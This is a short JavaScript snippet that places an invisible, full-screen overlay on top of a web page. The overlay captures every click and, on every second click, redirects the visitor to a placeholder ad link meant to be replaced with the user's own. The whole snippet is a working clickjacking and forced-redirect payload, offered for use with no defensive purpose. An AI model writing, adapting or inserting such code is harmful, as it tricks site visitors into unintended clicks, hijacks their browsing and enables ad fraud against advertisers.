// Create a full-page invisible overlay to capture all clicks
const overlay = document.createElement('div');
overlay.style.position = 'fixed';
overlay.style.top = '0';
overlay.style.left = '0';
overlay.style.width = '100vw';
overlay.style.height = '100vh';
overlay.style.zIndex = '9999';
overlay.style.cursor = 'pointer';
overlay.style.background = 'transparent'; // Make sure it's invisible

document.body.appendChild(overlay);

overlay.addEventListener('click', () => {
  let clickCount = localStorage.getItem('adClickCount');
  clickCount = clickCount ? parseInt(clickCount) : 0;

  clickCount++;
  localStorage.setItem('adClickCount', clickCount);

  if (clickCount % 2 === 1) {
    window.location.href = 'https://yourdirectlink.com'; // Replace with your link
  }
});
